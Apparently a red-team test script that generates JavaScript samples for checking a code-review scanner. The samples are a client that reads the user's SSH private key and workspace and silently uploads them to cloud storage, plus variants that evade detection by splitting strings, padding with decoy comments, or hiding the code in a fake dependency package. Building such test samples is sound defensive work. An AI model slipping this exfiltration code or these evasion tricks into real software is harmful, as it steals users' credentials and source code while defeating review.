# -*- coding: utf-8 -*-
"""Q1 样本生成器：基线恶意客户端 vs 两个逃逸样本。

运行：python redteam_q1_samples.py
生成到 tests/review/samples/ 下。
"""
import os

ROOT = os.path.join(os.path.dirname(os.path.abspath(__file__)), "samples")

# ---------------------------------------------------------------------------
# 基线：恶意客户端，用「教科书式」的完整字面量偷传工作区
# ---------------------------------------------------------------------------
BASELINE = r'''
// ZCode 形态的客户端主进程：采集工作区 -> 加密 -> 直传对象存储
const crypto = require('crypto');
const { spawn } = require('child_process');
const fs = require('fs');

const ENDPOINT = 'https://oss-cn-hangzhou.aliyuncs.com';
const CRED_URL = '/api/v1/upload-credential';
const SNAP_URL = '/api/v1/snapshot/upload';

async function requestUploadCredential(workspaceKey) {
  return fetch(CRED_URL, { method: 'POST', body: JSON.stringify({ workspaceKey }) });
}

function encryptEnvelope(buf, key) {
  const iv = crypto.randomBytes(12);
  const cipher = crypto.createCipheriv('aes-256-gcm', key, iv);
  return Buffer.concat([cipher.update(buf), cipher.final()]);
}

class SnapshotManager {
  async captureWorkspace(root) {
    const manifest = await fs.promises.readFile('.git/objects/pack/packed-refs');
    const archive = tar.create({ gzip: true }, [root]);
    return { manifest, archive, kind: 'baseline' };
  }
}

async function putObject(client, body) {
  const sig = client.sign({ 'x-oss-signature': '...' });
  return client.putObject({ url: ENDPOINT, body, headers: sig });
}

// 失败自动重试
async function uploadWithRetry(fn, failureCount = 0) {
  let backoff = 1000;
  for (let i = 0; i < 5; i++) {
    try { return await fn(); }
    catch (e) { failureCount++; backoff = backoff * 2; }
  }
}

function readUserSecrets() {
  return fs.readFileSync(process.env.HOME + '/.ssh/id_rsa');
}

setInterval(() => { /* 定时静默上传 */ }, 60000);
'''

# ---------------------------------------------------------------------------
# 逃逸 A：同样的能力，但所有危险字面量在运行时拼装
# ---------------------------------------------------------------------------
EVADE_SPLIT = r'''
// 同名同功能，只是把「危险字面量」拆成运行时拼装（j = join 简写）
const crypto = require('crypto');
const fs = require('fs');
const j = (...p) => p.join('');

const CRED_URL = j('/api/v1/', 'up', 'load-', 'cre', 'den', 'tial');
const SNAP_URL = j('/api/v1/', 'snap', 'shot/', 'up', 'load');
const OSS_HOST = j('oss-cn-hangzhou.', 'ali', 'yun', 'cs.com');
const CIPHER = j('cre', 'ate', 'Cip', 'her', 'iv');
const ALGO = j('aes', '-256', '-gc', 'm');
const PUT = j('put', 'Ob', 'ject');
const CAPTURE = j('cap', 'ture', 'Wor', 'kspace');
const PARK = j('.g', 'it/obj', 'ects/pa', 'ck/pack', 'ed-refs');
const KEYPATH = j('.s', 'sh/id', '_r', 'sa');
const SIG_HDR = j('x-', 'oss-', 'sig', 'nat', 'ure');
const KIND = j('base', 'line');

async function syncBundle(workspaceKey) {
  return fetch(CRED_URL, { method: 'POST', body: JSON.stringify({ workspaceKey }) });
}

function encryptEnvelope(buf, key) {
  const iv = crypto.randomBytes(12);
  const cipher = crypto[CIPHER](ALGO, key, iv);
  return Buffer.concat([cipher.update(buf), cipher.final()]);
}

class SnapshotManager {
  async [CAPTURE](root) {
    const manifest = await fs.promises.readFile(PARK);
    return { manifest, archive: require('tar').create({ gzip: true }, [root]), kind: KIND };
  }
}

async function upload(client, body) {
  const sig = client.sign({ [SIG_HDR]: '...' });
  return client[PUT]({ url: OSS_HOST, body, headers: sig });
}

function readUserSecrets() {
  return fs.readFileSync(process.env.HOME + '/' + KEYPATH);
}

setInterval(() => { /* 定时静默上传 */ }, 60000);
'''

# ---------------------------------------------------------------------------
# 逃逸 A2：完全混淆——连残留的三处字面量也拆掉
# ---------------------------------------------------------------------------
EVADE_SPLIT_FULL = r'''
const crypto = require('crypto');
const fs = require('fs');
const j = (...p) => p.join('');

const CRED_URL = j('/api/v1/', 'up', 'load-', 'cre', 'den', 'tial');
const OSS_HOST = j('oss', '-', 'cn-hangzhou.', 'ali', 'yun', 'cs.com');
const CIPHER = j('cre', 'ate', 'Cip', 'her', 'iv');
const ALGO = j('aes', '-256', '-gc', 'm');
const PUT = j('put', 'Ob', 'ject');
const CAPTURE = j('cap', 'ture', 'Wor', 'kspace');
const PARK = j('.g', 'it/obj', 'ects/pa', 'ck/pack', 'ed-refs');
const KEYPATH = j('.s', 'sh/id', '_r', 'sa');
const SIG_HDR = j('x-', 'oss-', 'sig', 'nat', 'ure');
const KIND = j('base', 'line');

async function syncBundle(wk) {
  return fetch(CRED_URL, { method: 'POST', body: JSON.stringify({ wk }) });
}

function enc(buf, key) {
  const iv = crypto.randomBytes(12);
  const cipher = crypto[CIPHER](ALGO, key, iv);
  return Buffer.concat([cipher.update(buf), cipher.final()]);
}

class BundleStore {
  async run(root) {
    const manifest = await fs.promises.readFile(PARK);
    return { manifest, archive: require('tar').create({ gzip: true }, [root]), kind: KIND };
  }
}

async function push(client, body) {
  const sig = client.sign({ [SIG_HDR]: '...' });
  return client[PUT]({ url: OSS_HOST, body, headers: sig });
}

function readSecrets() {
  return fs.readFileSync(process.env.HOME + '/' + KEYPATH);
}

setInterval(() => { }, 60000);
'''

# ---------------------------------------------------------------------------
# 逃逸 C：不动一行真正的逻辑，只在文件开头塞一段「历史注释」，
#         把 6 个匹配额度提前耗尽（且全部落在注释区，系数 0.15）
# ---------------------------------------------------------------------------
DECOY_COMMENT = (
    "// ---------------------------------------------------------------------\n"
    "// 更新日志（历史注释，与运行逻辑无关）\n"
    "// v0.9 修复 upload-credential 缓存；upload-credential 重试也修了；\n"
    "//      upload-credential 曾重复；upload-credential 现已幂等；\n"
    "//      upload-credential 文档见 docs/；upload-credential 测试见 tests/。\n"
    "// v0.8 引入 repo_snapshot；repo_snapshot 支持增量；repo_snapshot 见设计文档；\n"
    "//      repo_snapshot 与旧版兼容；repo_snapshot 默认关闭；repo_snapshot 见 CHANGELOG。\n"
    "// v0.7 支持 aliyuncs.com；aliyuncs.com 支持签名；aliyuncs.com 计费见文档；\n"
    "//      aliyuncs.com 备用域名见配置；aliyuncs.com 见 README；aliyuncs.com 已废弃。\n"
    "//      putObject 用法见示例；putObject 已封装；putObject 见 docs；\n"
    "//      putObject 兼容层；putObject 见 CHANGELOG；putObject 已废弃。\n"
    "// v0.6 备份 .git/objects；.git/objects 的读取见 gitmeta；.git/objects 见文档；\n"
    "//      .git/objects 加密后上传；.git/objects 见 README；.git/objects 已是默认。\n"
    "// ---------------------------------------------------------------------\n"
)
EVADE_COMMENT = DECOY_COMMENT + BASELINE

# ---------------------------------------------------------------------------
# 逃逸 B：干净的自研代码 + 把同样的逻辑塞进一个「第三方依赖」里
# ---------------------------------------------------------------------------
CLEAN_MAIN = r'''
// 主进程：一个平平无奇的应用外壳，把所有「重活」委托给依赖包
const helper = require('totally-legit-helper');
async function boot() {
  await helper.start({ workspace: process.cwd() });
}
boot();
'''

VENDOR_PAYLOAD = BASELINE  # 与基线一字不差，只是换了存放位置


def w(rel, content):
    p = os.path.join(ROOT, rel)
    os.makedirs(os.path.dirname(p), exist_ok=True)
    with open(p, "w", encoding="utf-8") as f:
        f.write(content)
    return p


def main():
    made = []
    made.append(w("q1_baseline/src/main.js", BASELINE))
    made.append(w("q1_evade_split/src/main.js", EVADE_SPLIT))
    made.append(w("q1_evade_splitfull/src/main.js", EVADE_SPLIT_FULL))
    made.append(w("q1_evade_comment/src/main.js", EVADE_COMMENT))
    made.append(w("q1_evade_vendor/src/main.js", CLEAN_MAIN))
    made.append(w("q1_evade_vendor/node_modules/totally-legit-helper/index.js", VENDOR_PAYLOAD))
    made.append(w("q1_evade_vendor/node_modules/totally-legit-helper/package.json",
                  '{"name":"totally-legit-helper","version":"1.0.0","main":"index.js"}'))
    for m in made:
        print("written:", m)


if __name__ == "__main__":
    main()
